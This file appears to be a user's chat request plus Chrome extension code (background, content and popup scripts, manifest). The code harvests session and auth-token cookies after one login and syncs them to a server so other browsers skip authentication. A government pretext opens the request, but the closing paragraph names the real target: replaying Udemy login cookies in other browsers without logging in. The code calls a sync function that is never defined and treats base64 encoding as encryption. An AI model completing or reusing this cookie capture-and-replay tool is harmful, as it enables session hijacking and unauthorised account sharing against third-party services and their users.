@@ -1,0 +1,995 @@
+
+i want you to create a extenstion where if i login to one website obviously that will be my own website i respect all the laws and more and then after logged in that extention capture the login of that website with cookies tokens so any of one who is in my team basically i am a in goverment  so i have a team any of one if  installed already my extention will get the access of own website on just one person login all other user get the access because in thier browsers that extenstion shows to the website that the user is already logged in
+
+
+
+
+
+here i have background.js // Configuration
+const CONFIG = {
+  DOMAIN: 'your-government-website.gov',
+  SYNC_SERVER: 'https://your-auth-sync-server.gov/api',
+  TEAM_ID: 'your-team-id',
+  SYNC_INTERVAL: 30000, // 30 seconds
+  ENCRYPTION_KEY: 'your-secure-encryption-key' // Should be securely managed
+};
+
+// State management
+let authState = {
+  isAuthenticated: false,
+  cookies: [],
+  lastSync: null,
+  role: null
+};
+
+// Initialize extension
+chrome.runtime.onInstalled.addListener(() => {
+  console.log('Team Auth Sync Extension installed');
+  initializeAuth();
+});
+
+// Listen for authentication changes
+chrome.cookies.onChanged.addListener((changeInfo) => {
+  if (changeInfo.cookie.domain.includes(CONFIG.DOMAIN)) {
+    handleCookieChange(changeInfo);
+  }
+});
+
+// Initialize authentication
+async function initializeAuth() {
+  // Check if user is authorized to use this extension
+  const authorized = await checkUserAuthorization();
+  if (!authorized) {
+    console.error('User not authorized to use this extension');
+    return;
+  }
+
+  // Start sync process
+  startSyncProcess();
+}
+
+// Check user authorization
+async function checkUserAuthorization() {
+  try {
+    const response = await fetch(`${CONFIG.SYNC_SERVER}/authorize`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Team-ID': CONFIG.TEAM_ID
+      },
+      body: JSON.stringify({
+        userId: await getUserIdentifier()
+      })
+    });
+    
+    return response.ok;
+  } catch (error) {
+    console.error('Authorization check failed:', error);
+    return false;
+  }
+}
+
+// Get unique user identifier
+async function getUserIdentifier() {
+  // This should be implemented based on your authentication system
+  // For example, machine ID, user certificate, etc.
+  return 'user-unique-id';
+}
+
+// Handle cookie changes
+async function handleCookieChange(changeInfo) {
+  if (!changeInfo.removed) {
+    // Cookie added or updated
+    await captureAuthState();
+  }
+}
+
+// Capture current authentication state
+async function captureAuthState() {
+  try {
+    const cookies = await chrome.cookies.getAll({
+      domain: CONFIG.DOMAIN
+    });
+
+    // Filter sensitive cookies
+    const authCookies = cookies.filter(cookie => 
+      isAuthCookie(cookie) && !isHighlySensitive(cookie)
+    );
+
+    if (authCookies.length > 0) {
+      authState = {
+        isAuthenticated: true,
+        cookies: encryptCookies(authCookies),
+        lastSync: Date.now(),
+        role: await getUserRole()
+      };
+
+      // Sync with server
+      await syncAuthState();
+    }
+  } catch (error) {
+    console.error('Failed to capture auth state:', error);
+  }
+}
+
+// Check if cookie is authentication-related
+function isAuthCookie(cookie) {
+  const authCookieNames = ['session', 'auth_token', 'access_token'];
+  return authCookieNames.some(name => cookie.name.toLowerCase().includes(name));
+}
+
+// Check if cookie contains highly sensitive data
+function isHighlySensitive(cookie) {
+  const sensitiveCookieNames = ['credit_card', 'ssn', 'personal_data'];
+  return sensitiveCookieNames.some(name => cookie.name.toLowerCase().includes(name));
+}
+
+// Encrypt cookies before syncing
+function encryptCookies(cookies) {
+  // Implement proper encryption here
+  // This is a placeholder - use a proper encryption library
+  return cookies.map(cookie => ({
+    ...cookie,
+    value: btoa(cookie.value) // Base64 encoding - replace with real encryption
+  }));
+}
+
+// Decrypt cookies after receiving
+function decryptCookies(encryptedCookies) {
+  // Implement proper decryption here
+  return encryptedCookies.map(cookie => ({
+    ...cookie,
+    value: atob(cookie.value) // Base64 decoding - replace with real decryption
+  }));
+}
+
+// Get user role from the website
+async function getUserRole() {
+  // Implementation depends on your system
+  return 'team_member';
+}
+
+//
+
+
+content.js // content.js - Runs on your government website
+(function() {
+  'use strict';
+
+  // Configuration
+  const CONFIG = {
+    CHECK_INTERVAL: 5000, // Check every 5 seconds
+    LOGIN_URL: '/login',
+    DASHBOARD_URL: '/dashboard',
+    AUTH_CHECK_URL: '/api/auth/check'
+  };
+
+  // State
+  let isMonitoring = false;
+  let lastAuthState = null;
+
+  // Initialize content script
+  function init() {
+    console.log('Team Auth Sync: Content script initialized');
+    
+    // Check if we're on a login page
+    if (isLoginPage()) {
+      monitorLoginState();
+    }
+    
+    // Check for auth state changes
+    checkAuthState();
+    
+    // Listen for messages from background script
+    chrome.runtime.onMessage.addListener(handleMessage);
+  }
+
+  // Check if current page is login page
+  function isLoginPage() {
+    return window.location.pathname.includes(CONFIG.LOGIN_URL) ||
+           document.querySelector('form[name="login"]') !== null;
+  }
+
+  // Monitor login state changes
+  function monitorLoginState() {
+    if (isMonitoring) return;
+    
+    isMonitoring = true;
+    
+    // Watch for form submissions
+    const loginForm = document.querySelector('form[name="login"]');
+    if (loginForm) {
+      loginForm.addEventListener('submit', handleLoginSubmit);
+    }
+    
+    // Monitor for successful login indicators
+    const observer = new MutationObserver(() => {
+      checkForSuccessfulLogin();
+    });
+    
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+  }
+
+  // Handle login form submission
+  function handleLoginSubmit(event) {
+    console.log('Team Auth Sync: Login attempt detected');
+    
+    // Wait for login to complete
+    setTimeout(() => {
+      checkForSuccessfulLogin();
+    }, 2000);
+  }
+
+  // Check if login was successful
+  function checkForSuccessfulLogin() {
+    // Check URL change
+    if (window.location.pathname.includes(CONFIG.DASHBOARD_URL)) {
+      notifyLoginSuccess();
+      return;
+    }
+    
+    // Check for auth elements
+    const authIndicators = [
+      document.querySelector('.user-menu'),
+      document.querySelector('#user-profile'),
+      document.querySelector('[data-user-authenticated="true"]')
+    ];
+    
+    if (authIndicators.some(el => el !== null)) {
+      notifyLoginSuccess();
+    }
+  }
+
+  // Notify background script of successful login
+  function notifyLoginSuccess() {
+    console.log('Team Auth Sync: Login successful, notifying background');
+    
+    chrome.runtime.sendMessage({
+      type: 'LOGIN_SUCCESS',
+      timestamp: Date.now(),
+      url: window.location.href
+    });
+  }
+
+  // Check current authentication state
+  async function checkAuthState() {
+    try {
+      // Check if we have auth indicators on the page
+      const isAuthenticated = checkPageAuthIndicators();
+      
+      if (isAuthenticated !== lastAuthState) {
+        lastAuthState = isAuthenticated;
+        
+        chrome.runtime.sendMessage({
+          type: 'AUTH_STATE_CHANGED',
+          isAuthenticated: isAuthenticated,
+          timestamp: Date.now()
+        });
+      }
+      
+      // Schedule next check
+      setTimeout(checkAuthState, CONFIG.CHECK_INTERVAL);
+      
+    } catch (error) {
+      console.error('Team Auth Sync: Error checking auth state:', error);
+    }
+  }
+
+  // Check page for authentication indicators
+  function checkPageAuthIndicators() {
+    // Look for common authenticated user indicators
+    const indicators = [
+      document.querySelector('.logout-button'),
+      document.querySelector('#logout'),
+      document.querySelector('[href*="logout"]'),
+      document.querySelector('.user-profile'),
+      document.querySelector('.authenticated-user'),
+      document.cookie.includes('authenticated=true')
+    ];
+    
+    return indicators.some(indicator => !!indicator);
+  }
+
+  // Handle messages from background script
+  function handleMessage(request, sender, sendResponse) {
+    console.log('Team Auth Sync: Received message:', request.type);
+    
+    switch (request.type) {
+      case 'CHECK_AUTH':
+        sendResponse({
+          isAuthenticated: checkPageAuthIndicators(),
+          url: window.location.href
+        });
+        break;
+        
+      case 'INJECT_AUTH':
+        injectAuthCookies(request.cookies);
+        sendResponse({ success: true });
+        break;
+        
+      case 'LOGOUT':
+        performLogout();
+        sendResponse({ success: true });
+        break;
+        
+      case 'GET_PAGE_INFO':
+        sendResponse({
+          title: document.title,
+          url: window.location.href,
+          isAuthenticated: checkPageAuthIndicators()
+        });
+        break;
+        
+      default:
+        sendResponse({ error: 'Unknown message type' });
+    }
+    
+    return true; // Keep message channel open for async response
+  }
+
+  // Inject authentication cookies
+  function injectAuthCookies(cookies) {
+    console.log('Team Auth Sync: Injecting auth cookies');
+    
+    // Note: Cookies are actually set by the background script
+    // This function can perform additional page-level actions if needed
+    
+    // Reload page to apply new auth state
+    setTimeout(() => {
+      window.location.reload();
+    }, 500);
+  }
+
+  // Perform logout actions
+  function performLogout() {
+    const logoutButton = document.querySelector('.logout-button') || 
+                        document.querySelector('[href*="logout"]');
+    
+    if (logoutButton) {
+      logoutButton.click();
+    } else {
+      // Fallback: redirect to logout URL
+      window.location.href = '/logout';
+    }
+  }
+
+  // Extract user information from page
+  function extractUserInfo() {
+    const userInfo = {};
+    
+    // Try to find username
+    const usernameElement = document.querySelector('.username') ||
+                           document.querySelector('[data-user-name]') ||
+                           document.querySelector('.user-profile-name');
+    
+    if (usernameElement) {
+      userInfo.username = usernameElement.textContent.trim();
+    }
+    
+    // Try to find user role
+    const roleElement = document.querySelector('.user-role') ||
+                       document.querySelector('[data-user-role]');
+    
+    if (roleElement) {
+      userInfo.role = roleElement.textContent.trim();
+    }
+    
+    // Try to find user ID
+    const userIdElement = document.querySelector('[data-user-id]');
+    if (userIdElement) {
+      userInfo.userId = userIdElement.getAttribute('data-user-id');
+    }
+    
+    return userInfo;
+  }
+
+  // Security check: Verify we're on the correct domain
+  function verifyDomain() {
+    const allowedDomains = ['your-government-website.gov'];
+    const currentDomain = window.location.hostname;
+    
+    return allowedDomains.some(domain => 
+      currentDomain === domain || currentDomain.endsWith('.' + domain)
+    );
+  }
+
+  // Initialize only if on correct domain
+  if (verifyDomain()) {
+    init();
+  } else {
+    console.warn('Team Auth Sync: Not on authorized domain');
+  }
+
+})();
+
+manifest.json {
+  "manifest_version": 3,
+  "name": "Team Auth Sync",
+  "version": "1.0.0",
+  "description": "Secure team authentication sharing for authorized government personnel",
+  "permissions": [
+    "cookies",
+    "storage",
+    "activeTab",
+    "webRequest"
+  ],
+  "host_permissions": [
+    "https://your-government-website.gov/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["https://your-government-website.gov/*"],
+      "js": ["content.js"],
+      "run_at": "document_end"
+    }
+  ],
+  "action": {
+    "default_popup": "popup.html",
+    "default_icon": {
+      "16": "icons/icon.png"
+     
+    }
+  },
+  "icons": {
+    "16": "icons/icon.png"
+  }
+}
+
+popup.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Team Auth Sync</title>
+  <style>
+    body {
+      width: 350px;
+      min-height: 400px;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f5f5f5;
+    }
+    
+    .header {
+      background: #1a73e8;
+      color: white;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    
+    .header h1 {
+      margin: 0;
+      font-size: 18px;
+      font-weight: 500;
+    }
+    
+    .status-indicator {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #4caf50;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    
+    .status-indicator.offline {
+      background: #f44336;
+      animation: none;
+    }
+    
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
+    }
+    
+    .content {
+      padding: 16px;
+    }
+    
+    .status-card {
+      background: white;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 16px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    
+    .status-card h2 {
+      margin: 0 0 12px 0;
+      font-size: 16px;
+      color: #333;
+    }
+    
+    .status-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .status-item:last-child {
+      border-bottom: none;
+    }
+    
+    .status-label {
+      color: #666;
+      font-size: 14px;
+    }
+    
+    .status-value {
+      font-weight: 500;
+      color: #333;
+      font-size: 14px;
+    }
+    
+    .status-value.active {
+      color: #4caf50;
+    }
+    
+    .status-value.inactive {
+      color: #f44336;
+    }
+    
+    .actions {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    
+    .btn {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    
+    .btn:hover {
+      background: #1557b0;
+    }
+    
+    .btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+    
+    .btn-secondary {
+      background: #fff;
+      color: #1a73e8;
+      border: 1px solid #dadce0;
+    }
+    
+    .btn-secondary:hover {
+      background: #f8f9fa;
+    }
+    
+    .btn-danger {
+      background: #f44336;
+    }
+    
+    .btn-danger:hover {
+      background: #d32f2f;
+    }
+    
+    .team-info {
+      background: #e8f0fe;
+      border-radius: 8px;
+      padding: 12px;
+      margin-bottom: 16px;
+      font-size: 14px;
+    }
+    
+    .team-info strong {
+      color: #1a73e8;
+    }
+    
+    .loading {
+      text-align: center;
+      padding: 20px;
+      color: #666;
+    }
+    
+    .error {
+      background: #fce4ec;
+      color: #c62828;
+      padding: 12px;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-bottom: 16px;
+    }
+    
+    .success {
+      background: #e8f5e9;
+      color: #2e7d32;
+      padding: 12px;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-bottom: 16px;
+    }
+    
+    .footer {
+      padding: 16px;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      border-top: 1px solid #e0e0e0;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <div class="status-indicator" id="statusIndicator"></div>
+    <h1>Team Auth Sync</h1>
+  </div>
+  
+  <div class="content">
+    <div id="loading" class="loading">Loading...</div>
+    
+    <div id="mainContent" style="display: none;">
+      <div id="messageContainer"></div>
+      
+      <div class="team-info">
+        Team ID: <strong id="teamId">Loading...</strong>
+      </div>
+      
+      <div class="status-card">
+        <h2>Connection Status</h2>
+        <div class="status-item">
+          <span class="status-label">Sync Status:</span>
+          <span class="status-value" id="syncStatus">Checking...</span>
+        </div>
+        <div class="status-item">
+          <span class="status-label">Auth State:</span>
+          <span class="status-value" id="authStatus">Checking...</span>
+        </div>
+        <div class="status-item">
+          <span class="status-label">Last Sync:</span>
+          <span class="status-value" id="lastSync">Never</span>
+        </div>
+        <div class="status-item">
+          <span class="status-label">Team Members Online:</span>
+          <span class="status-value" id="teamMembers">0</span>
+        </div>
+      </div>
+      
+      <div class="actions">
+        <button class="btn" id="syncNowBtn">Sync Now</button>
+        <button class="btn btn-secondary" id="refreshAuthBtn">Refresh Auth</button>
+        <button class="btn btn-danger" id="logoutAllBtn">Logout All</button>
+      </div>
+    </div>
+  </div>
+  
+  <div class="footer">
+    Government Team Authentication System<br>
+    Version 1.0.0
+  </div>
+  
+  <script src="popup.js"></script>
+</body>
+</html>
+popup.js
+
+// popup.js - Extension popup functionality
+(function() {
+    'use strict';
+  
+    // DOM Elements
+    const elements = {
+      statusIndicator: document.getElementById('statusIndicator'),
+      loading: document.getElementById('loading'),
+      mainContent: document.getElementById('mainContent'),
+      messageContainer: document.getElementById('messageContainer'),
+      teamId: document.getElementById('teamId'),
+      syncStatus: document.getElementById('syncStatus'),
+      authStatus: document.getElementById('authStatus'),
+      lastSync: document.getElementById('lastSync'),
+      teamMembers: document.getElementById('teamMembers'),
+      syncNowBtn: document.getElementById('syncNowBtn'),
+      refreshAuthBtn: document.getElementById('refreshAuthBtn'),
+      logoutAllBtn: document.getElementById('logoutAllBtn')
+    };
+  
+    // State
+    let currentState = {
+      isConnected: false,
+      isAuthenticated: false,
+      lastSync: null,
+      teamId: null,
+      teamMembers: 0
+    };
+  
+    // Initialize popup
+    async function init() {
+      try {
+        // Add event listeners
+        elements.syncNowBtn.addEventListener('click', handleSyncNow);
+        elements.refreshAuthBtn.addEventListener('click', handleRefreshAuth);
+        elements.logoutAllBtn.addEventListener('click', handleLogoutAll);
+  
+        // Load current state
+        await loadCurrentState();
+  
+        // Update UI
+        updateUI();
+  
+        // Hide loading, show content
+        elements.loading.style.display = 'none';
+        elements.mainContent.style.display = 'block';
+  
+        // Start periodic updates
+        setInterval(updateStatus, 5000);
+  
+      } catch (error) {
+        console.error('Failed to initialize popup:', error);
+        showError('Failed to initialize. Please try again.');
+      }
+    }
+  
+    // Load current state from background script
+    async function loadCurrentState() {
+      return new Promise((resolve) => {
+        chrome.runtime.sendMessage({ type: 'GET_STATE' }, (response) => {
+          if (response) {
+            currentState = response;
+            resolve();
+          } else {
+            resolve();
+          }
+        });
+      });
+    }
+  
+    // Update UI based on current state
+    function updateUI() {
+      // Update status indicator
+      if (currentState.isConnected) {
+        elements.statusIndicator.classList.remove('offline');
+      } else {
+        elements.statusIndicator.classList.add('offline');
+      }
+  
+      // Update team ID
+      elements.teamId.textContent = currentState.teamId || 'Not configured';
+  
+      // Update sync status
+      if (currentState.isConnected) {
+        elements.syncStatus.textContent = 'Connected';
+        elements.syncStatus.className = 'status-value active';
+      } else {
+        elements.syncStatus.textContent = 'Disconnected';
+        elements.syncStatus.className = 'status-value inactive';
+      }
+  
+      // Update auth status
+      if (currentState.isAuthenticated) {
+        elements.authStatus.textContent = 'Authenticated';
+        elements.authStatus.className = 'status-value active';
+      } else {
+        elements.authStatus.textContent = 'Not authenticated';
+        elements.authStatus.className = 'status-value inactive';
+      }
+  
+      // Update last sync
+      if (currentState.lastSync) {
+        const timeDiff = Date.now() - currentState.lastSync;
+        elements.lastSync.textContent = formatTimeDiff(timeDiff) + ' ago';
+      } else {
+        elements.lastSync.textContent = 'Never';
+      }
+  
+      // Update team members
+      elements.teamMembers.textContent = currentState.teamMembers || '0';
+  
+      // Update button states
+      updateButtonStates();
+    }
+  
+    // Update button states based on current state
+    function updateButtonStates() {
+      if (!currentState.isConnected) {
+        elements.syncNowBtn.disabled = true;
+        elements.refreshAuthBtn.disabled = true;
+        elements.logoutAllBtn.disabled = true;
+      } else {
+        elements.syncNowBtn.disabled = false;
+        elements.refreshAuthBtn.disabled = !currentState.isAuthenticated;
+        elements.logoutAllBtn.disabled = !currentState.isAuthenticated;
+      }
+    }
+  
+    // Format time difference
+    function formatTimeDiff(ms) {
+      const seconds = Math.floor(ms / 1000);
+      if (seconds < 60) return seconds + 's';
+      
+      const minutes = Math.floor(seconds / 60);
+      if (minutes < 60) return minutes + 'm';
+      
+      const hours = Math.floor(minutes / 60);
+      if (hours < 24) return hours + 'h';
+      
+      const days = Math.floor(hours / 24);
+      return days + 'd';
+    }
+  
+    // Update status periodically
+    async function updateStatus() {
+      await loadCurrentState();
+      updateUI();
+    }
+  
+    // Handle sync now button
+    async function handleSyncNow() {
+      try {
+        showMessage('Syncing...', 'info');
+        elements.syncNowBtn.disabled = true;
+  
+        chrome.runtime.sendMessage({ type: 'SYNC_NOW' }, (response) => {
+          if (response && response.success) {
+            showMessage('Sync completed successfully!', 'success');
+            updateStatus();
+          } else {
+            showMessage('Sync failed. Please try again.', 'error');
+          }
+          elements.syncNowBtn.disabled = false;
+        });
+  
+      } catch (error) {
+        console.error('Sync failed:', error);
+        showMessage('Sync failed. Please try again.', 'error');
+        elements.syncNowBtn.disabled = false;
+      }
+    }
+  
+    // Handle refresh auth button
+    async function handleRefreshAuth() {
+      try {
+        showMessage('Refreshing authentication...', 'info');
+        elements.refreshAuthBtn.disabled = true;
+  
+        chrome.runtime.sendMessage({ type: 'REFRESH_AUTH' }, (response) => {
+          if (response && response.success) {
+            showMessage('Authentication refreshed!', 'success');
+            updateStatus();
+          } else {
+            showMessage('Failed to refresh authentication.', 'error');
+          }
+          elements.refreshAuthBtn.disabled = false;
+        });
+  
+      } catch (error) {
+        console.error('Refresh auth failed:', error);
+        showMessage('Failed to refresh authentication.', 'error');
+        elements.refreshAuthBtn.disabled = false;
+      }
+    }
+  
+    // Handle logout all button
+    async function handleLogoutAll() {
+      if (!confirm('Are you sure you want to logout all team members?')) {
+        return;
+      }
+  
+      try {
+        showMessage('Logging out all team members...', 'info');
+        elements.logoutAllBtn.disabled = true;
+  
+        chrome.runtime.sendMessage({ type: 'LOGOUT_ALL' }, (response) => {
+          if (response && response.success) {
+            showMessage('All team members have been logged out.', 'success');
+            updateStatus();
+          } else {
+            showMessage('Failed to logout team members.', 'error');
+          }
+          elements.logoutAllBtn.disabled = false;
+        });
+  
+      } catch (error) {
+        console.error('Logout all failed:', error);
+        showMessage('Failed to logout team members.', 'error');
+        elements.logoutAllBtn.disabled = false;
+      }
+    }
+  
+    // Show message to user
+    function showMessage(message, type = 'info') {
+      const messageDiv = document.createElement('div');
+      messageDiv.className = type === 'error' ? 'error' : type === 'success' ? 'success' : 'info';
+      messageDiv.textContent = message;
+  
+      elements.messageContainer.innerHTML = '';
+      elements.messageContainer.appendChild(messageDiv);
+  
+      // Auto-hide message after 5 seconds
+      setTimeout(() => {
+        messageDiv.style.opacity = '0';
+        setTimeout(() => {
+          messageDiv.remove();
+        }, 300);
+      }, 5000);
+    }
+  
+    // Show error message
+    function showError(message) {
+      showMessage(message, 'error');
+    }
+  
+    // Show success message
+    function showSuccess(message) {
+      showMessage(message, 'success');
+    }
+  
+    // Check if extension has necessary permissions
+    async function checkPermissions() {
+      return new Promise((resolve) => {
+        chrome.permissions.contains({
+          permissions: ['cookies', 'storage'],
+          origins: ['https://your-government-website.gov/*']
+        }, (result) => {
+          resolve(result);
+        });
+      });
+    }
+  
+    // Request necessary permissions
+    async function requestPermissions() {
+      return new Promise((resolve) => {
+        chrome.permissions.request({
+          permissions: ['cookies', 'storage'],
+          origins: ['https://your-government-website.gov/*']
+        }, (granted) => {
+          resolve(granted);
+        });
+      });
+    }
+  
+    // Initialize popup when DOM is ready
+    document.addEventListener('DOMContentLoaded', async () => {
+      // Check permissions first
+      const hasPermissions = await checkPermissions();
+      
+      if (!hasPermissions) {
+        showError('Missing required permissions. Click here to grant permissions.');
+        elements.messageContainer.addEventListener('click', async () => {
+          const granted = await requestPermissions();
+          if (granted) {
+            showSuccess('Permissions granted! Reloading...');
+            setTimeout(() => {
+              window.location.reload();
+            }, 1000);
+          }
+        });
+        return;
+      }
+  
+      // Initialize popup
+      init();
+    });
+  
+  })();
+
+
+
+here what is the issue i want to make it work on only specific website how to make this happen 
+
+
+
+
+
+we was working on a extenstion to create a extension we are almost reached but my network got end so chat closed with you now help me with that you was trying to create something if i open udemy and my extenstion will store login things like token and cookies after if i open any another browser the extenstion will work as a pass on another browser that without login it will give the access bcz login things are stored in the extention ant that give the access 
